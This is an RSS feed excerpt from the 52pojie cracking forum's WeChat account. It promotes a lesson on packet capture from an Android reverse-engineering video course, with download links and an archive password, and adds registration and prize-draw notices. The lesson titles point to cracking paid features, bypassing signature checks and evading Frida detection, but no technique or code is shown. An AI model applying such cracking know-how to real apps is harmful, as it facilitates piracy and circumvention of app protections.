<p><a href="https://wechat2rss.xlab.app/link-proxy/?k=dd0a1d8b&amp;r=1&amp;u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMjM5Mjc3MDM2Mw%3D%3D%26mid%3D2651141017%26idx%3D1%26sn%3D057c483892bc8fea3b431f088b0da0dd%26chksm%3Dbd50a3cd8a272adb224aea0e388a679203cc9633523d32769f7ecae305b055e426a345b59d52%26scene%3D58%26subscene%3D0%23rd">跳转微信打开</a></p>
]]></content:encoded>
<pubDate>Sat, 20 Jul 2024 04:04:40 +0800</pubDate>
</item>
<item>
<title>吾爱破解安卓逆向入门教程《安卓逆向这档事》二十课、抓包学得好，牢饭吃得饱(上)</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141015&amp;idx=1&amp;sn=f5e09409bc7c21d76f924e57754ece4f&amp;chksm=bd50a3c38a272ad56480f610a8ab36830d2a87765b5df9398ffc90feb6cb147232570c45e21b&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141015&amp;idx=1&amp;sn=f5e09409bc7c21d76f924e57754ece4f&amp;chksm=bd50a3c38a272ad56480f610a8ab36830d2a87765b5df9398ffc90feb6cb147232570c45e21b&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-19 11:48</span> <span style="display: inline-block;">北京</span>
</p>

<p>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向 0基础 新手小白 视频教程《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=3ea7ab24&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZIjWz4icq4gSaZVs6bw1nno8vqa5I67RiaTcFFibylIjkUiaNVngPDWicy68wxoKKqpcNS2dddn5uzbgzA%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="background-color: rgb(255, 255, 255); letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="background-color: rgb(255, 255, 255); letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>论</span></strong><strong style="background-color: rgb(255, 255, 255); letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>坛账号：正己</span></strong></p><p><br /></p><p><span style="background-color: rgb(255, 251, 0);">这是面向 <strong>0基础</strong> <strong>新手入门</strong> 的<strong>视频动画教程</strong>，后面一大段文字只是视频讲解课件，直接拉到<strong>底部点击“</strong><strong>阅读原文”</strong><strong>观看视频</strong>，手把手教学，入门建议从第一课学起，持续更新中。</span></p><p><span>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向</span><span style="color: rgb(255, 0, 0);"><strong><span> 0基础 新手小白 视频教程</span></strong></span><span>《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</span></p><p><span>前情提要：<a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140730&amp;idx=1&amp;sn=35c28447e545cfca350016102548d63b&amp;chksm=bd50a22e8a272b3820b8289e4b53222643fa91a8f1fc1a06328f73c3f2572d771cc051659d44&amp;scene=21#wechat_redirect" target="_blank">吾爱破解安卓逆向入门教程《安卓逆向这档事》十九、表哥，你也不想你的Frida被检测吧!(下)</a></span></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="line-height: normal; margin-bottom: 0px;"><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=7999f22d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIjWz4icq4gSaZVs6bw1nno8Pib37zkC1csF5fIctdHZ1PnkYCYic90utd3PZpZ5K53kqH0RSC7pxUrw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p>1.了解抓包技术的基本原理和应用场景2.了解多种抓包工具进行安卓App的网络通信分析<br />3.了解网络协议的基础知识并能应用于抓包分析</p><p>1.教程Demo<br />2.Reqable</p><h2>略。。。过程太长见论坛远程，看视频教程就行。</h2><p><span>百度云：</span></p><p><span style="font-size: 15px;">https://pan.baidu.com/s/1cFWTLn14jeWfpXxlx3syYw?pwd=nqu9</span></p><p><span style="font-size: 15px;">阿里云PS：</span></p><p><span style="font-size: 15px;">https://www.aliyundrive.com/s/TJoKMK6du6x</span></p><p><span style="font-size: 15px;">哔哩哔哩：</span></p><p><span style="font-size: 15px;">https://www.bilibili.com/video/BV1X24y1m7cj</span></p><p><span style="font-size: 15px;">教程开源地址：</span></p><p><span style="font-size: 15px;">https://github.com/ZJ595/AndroidReverse</span></p><p><span style="font-size: 15px;"><br /></span></p><p><span>PS:解压密码都是52pj，阿里云由于不能分享压缩包，所以下载exe文件，双击自解压</span></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138475&amp;idx=1&amp;sn=e3c5242b7c51f022fcc0efb7f626ab61&amp;chksm=bd50b9ff8a2730e9484df2faa08ed63c1980d5f230b69200450917b0daae1904505c878daca8&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》一、模拟器环境搭建</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138483&amp;idx=1&amp;sn=efa7eabbf0b0cc637a0ccdf8dd62abe5&amp;chksm=bd50b9e78a2730f1f994976f36a60dd8390c4920396b8aec2052b4a666d91d18555096fc8172&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》二、初识APK文件结构、双开、汉化、基础修改</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138541&amp;idx=1&amp;sn=c7482f59c3d830b2646e276761928941&amp;chksm=bd50b9b98a2730af72e1f9e346663c12973821967c1ac002f5fcdabd0182af5f6106b36d6a01&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》三、初识smail，vip终结者</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138554&amp;idx=1&amp;sn=be2fe7ffb0520ef17405a754ff0725c8&amp;chksm=bd50b9ae8a2730b84d054c7bd903f8a066251266e16cb1438999759797383e6f20aa656fbbff&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》四、恭喜你获得广告&amp;弹窗静默卡</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138674&amp;idx=1&amp;sn=17a3271b1771bdacf3392fb64dcc5dc3&amp;chksm=bd50ba268a273330bea4fd1804afff15b9308ed53c88d9aa26a363da0bdeff63642fcce3a42b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》五、1000-7=？&amp;动态调试&amp;Log插桩</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138693&amp;idx=1&amp;sn=a09896ce9c1aa5e7194600ff7ca011e9&amp;chksm=bd50bad18a2733c7c536438f5181eb3d73a57c0349e010fda23d7973cb0ebf272f15b82be56a&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》六、校验的N次方-签名校验对抗、PM代{过}{滤}理、IO重定向</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138779&amp;idx=1&amp;sn=7201ed7aca4cdd6954787022c7f26b81&amp;chksm=bd50ba8f8a2733998f65348060f3f6202bea1bba2f61d27e259ecf5521425ccdfcbb93510d06&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》七、Sorry，会Hook真的可以为所欲为-Xposed快速上手(上)模块编写,常用Api</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138987&amp;idx=1&amp;sn=c36c67b952a02f676fcdd5fb5c42abbc&amp;chksm=bd50bbff8a2732e9c5b256ec89ab50fe1df5158dfbcd4592f4440f564dec4d31e20387e0175b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》八、Sorry，会Hook真的可以为所欲为-xposed快速上手(下)快速hook</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139179&amp;idx=1&amp;sn=26e374dfb5776d41a7d3501770915a77&amp;chksm=bd50bc3f8a2735293c12856cfabf63aa694a2c66b8846a83eb9e301ac60d31484ed1600b8e1c&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》九、密码学基础、算法自吐、非标准加密对抗</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139564&amp;idx=1&amp;sn=ed1a626174cd39572544fa54e320e135&amp;chksm=bd50bdb88a2734ae34b4d4bad5de061a368863cab0ac1e51c5969c926a6ebab29fbe5f729cbf&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十、不是我说，有了IDA还要什么女朋友？</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139620&amp;idx=1&amp;sn=d65e23f4c8a5bc6cf94637af05025cea&amp;chksm=bd50be708a273766f5f00b91d3df8921283fecb3b2b54432bdee2b2b3330b5ea76c68f857bc9&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十二、大佬帮我分析一下</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139664&amp;idx=1&amp;sn=8f76acd55355f1000afc0c85e35212b0&amp;chksm=bd50be048a2737124982c5985c5a5b2393fafcf77a30f43adb9072719092167c35f738afccce&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》番外实战篇1-某电影视全家桶</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139714&amp;idx=1&amp;sn=28cc2ca160f7168a5ac43f658c5b57cd&amp;chksm=bd50bed68a2737c0ed9ff5513b2cf6aa5bcc6176f28b14f47bf8d32485b1d557bbc5f14f65bc&amp;scene=21#wechat_redirect" target="_blank"><span style="color: rgb(68, 68, 68);">《安卓逆向这档事》十三、是时候学习一下Frida一把梭了(上)</span></a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139750&amp;idx=1&amp;sn=17a282c1f0e2c56e7d8321867bc2685e&amp;chksm=bd50bef28a2737e4dae8032de4d19cf8e226a00801419c34b837b02074e10f84fe1c1aec4130&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十四、是时候学习一下Frida一把梭了(中)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十五、是时候学习一下Frida一把梭了(下)</a></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139867&amp;idx=1&amp;sn=cf9c990403c548b8495b3dde935a4644&amp;chksm=bd50bf4f8a273659ea78e3d7c191cdab463b4bc469f63fd5749028dba0fbf79fd796d74308fc&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十六、是时候学习一下Frida一把梭了(终)</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140090&amp;idx=1&amp;sn=d8b3011c016ae650d83db7bd9363878c&amp;chksm=bd50bfae8a2736b8260a8115ae2b0b95c929c8b221cabd8733853f6ba5409180b6a1443b30c0&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十七、你的RPCvs佬的RPC</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140106&amp;idx=1&amp;sn=47a4d985cc32e332e1e039fc810896de&amp;chksm=bd50a05e8a272948a2fc4af36269aeb24616aec58c3391d960ad4b6d37709bcdf1b5242891af&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》番外实战篇2-【2024春节】解题领红包活动，启动!</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140642&amp;idx=1&amp;sn=cf8328f89aff48e3c338fee43e3a5d43&amp;chksm=bd50a2768a272b60ea07cc97059a54accace2b6e99ed2ac50d1e10ffc2370eae73f2c32e65d9&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十八、表哥，你也不想你的Frida被检测吧!(上)</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140730&amp;idx=1&amp;sn=35c28447e545cfca350016102548d63b&amp;chksm=bd50a22e8a272b3820b8289e4b53222643fa91a8f1fc1a06328f73c3f2572d771cc051659d44&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十九、表哥，你也不想你的Frida被检测吧!(下)</a><br /></span><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" style="color: rgb(68, 68, 68); cursor: pointer;" target="_blank"></a><br /></p><p>Hook入门与抓包前端人必须掌握的抓包技能一种对QUIC协议的抓包方案（拿某知名APP练手）<br />一文详解 HTTPS 与 TLS证书链校验</p><p><span><br /></span></p><p><span>详细文字介绍、视频原件下载、视频所用到的程序下载、课后作业和学习交流参看论坛原文：</span></p><p><span>https://www.52pojie.cn/thread-1945285-1-1.html</span></p><p><span><br /></span></p><p><span style="font-size: 24px;"><span style="color: rgb(255, 0, 0);">点击左下角“阅读原文”，</span><strong><span style="color: rgb(255, 0, 0);">进入 <em>B站 </em>在</span></strong></span><span style="color: rgb(255, 0, 0); font-size: 24px;"><strong>线观看视频教程，</strong>欢迎一键三连转发</span><span style="font-size: 24px; color: rgb(255, 0, 0);">~</span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="display: none;"></p>



<p><a href="https://www.bilibili.com/video/BV1Vi421a7Pd/">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 19 Jul 2024 11:47:41 +0800</pubDate>
</item>
<item>
<title>暑假开放注册微信抽奖活动，再送40个账号注册码或300论坛币，周六下午两点开奖，详见：【开放注册公告】吾爱破解论坛2024年7月21日暑假开放注册公告。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141008&amp;idx=1&amp;sn=ed6a922610428c48b4863fe4f6c174c2&amp;chksm=bd50a3c48a272ad2a839db6548e2c0842cf0ec216366ff94b937f4737ae0699ff5697c5ed700&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141008&amp;idx=1&amp;sn=ed6a922610428c48b4863fe4f6c174c2&amp;chksm=bd50a3c48a272ad2a839db6548e2c0842cf0ec216366ff94b937f4737ae0699ff5697c5ed700&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span></span> <span>2024-07-18 15:44</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>

<div class="profile_area_hide" id="js_top_profile"><div class="wx_follow_context wx_follow_primary wx_follow_smart wx_follow_top " id="follow_placeholder"><div class="wx_follow_media weui-flex weui-flex_align-center "><div class="wx_follow_hd "><img class="wx_follow_avatar " src="http://mmsns.qpic.cn/mmsns/LFPriaSjBUZKGJ6e3ahOG8KFMaic9NIoicZ52tP0YFAgsQjwWjialyl8GQ/300" /></div> <div class="wx_follow_bd weui-flex__item "><div class="wx_follow_info "><div class="wx_follow_nickname ">吾爱破解论坛</div></div></div></div></div></div> <div class="share_notice js_share_notice_dom  "><!----> </div> <!----> <!----> <div class="wx_album_area js_album_wrap "></div> <!----> <div class="rich_media_meta_list "><div class="rich_media_meta_area_primary "><!----> <!----> </div> <div class="rich_media_meta_area_extra "><span class="rich_media_meta rich_media_meta_text " id="publish_time"></span>  <span class="rich_media_meta rich_media_meta_text " id="js_ip_wording_wrp" style="display: none;"><span id="js_ip_wording"></span></span></div></div>
]]></content:encoded>
<pubDate>Thu, 18 Jul 2024 15:43:47 +0800</pubDate>
</item>
<item>
<title>【开放注册公告】吾爱破解论坛2024年7月21日暑假开放注册公告</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141006&amp;idx=1&amp;sn=b0387dbb5b14eb8165cd82ab00e847b1&amp;chksm=bd50a3da8a272acc668e71d32965cc0bfd0e1a5a7e859cd172e277b5ced3855569066b498fcf&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141006&amp;idx=1&amp;sn=b0387dbb5b14eb8165cd82ab00e847b1&amp;chksm=bd50a3da8a272acc668e71d32965cc0bfd0e1a5a7e859cd172e277b5ced3855569066b498fcf&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-17 18:24</span> <span style="display: inline-block;">北京</span>
</p>

<p>内有福利，再送40个账号注册码或300论坛币，吾爱破解论坛开放注册时间：2024年7月21日  12：00 -- 14：00 和  20：00 -- 22：00，赶紧上好闹钟顺便告诉小伙伴吧。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=4d4b4087&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKRP0qgyCAugN0VnYiblj3nJKlOLNIr2rdoJ8hH9icGltjmpicibCjJBfUJGwHvOmVh7InDutgLUxZKxQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">A</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">e</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">从</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">日</span></span><span style="display: inline-block; text-indent: initial;">建</span><span style="display: inline-block; text-indent: initial;">立</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">陪</span><span style="display: inline-block; text-indent: initial;">伴</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">了</span><strong><span style="color: rgb(0, 0, 255); background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">年</span></span></strong><span style="display: inline-block; text-indent: initial;">艰</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">辉</span><span style="display: inline-block; text-indent: initial;">煌</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">雨</span><span style="display: inline-block; text-indent: initial;">历</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">手</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span></span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">门</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">基</span><span style="display: inline-block; text-indent: initial;">础</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">汇</span><span style="display: inline-block; text-indent: initial;">集</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">批</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">此</span><span style="display: inline-block; text-indent: initial;">栖</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">今</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">依</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">忘</span><span style="display: inline-block; text-indent: initial;">初</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">起</span><span style="display: inline-block; text-indent: initial;">到</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">承</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">启</span><span style="display: inline-block; text-indent: initial;">下</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">圣</span><span style="display: inline-block; text-indent: initial;">殿</span><span style="display: inline-block; text-indent: initial;">。</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">博</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">朋</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">消</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: 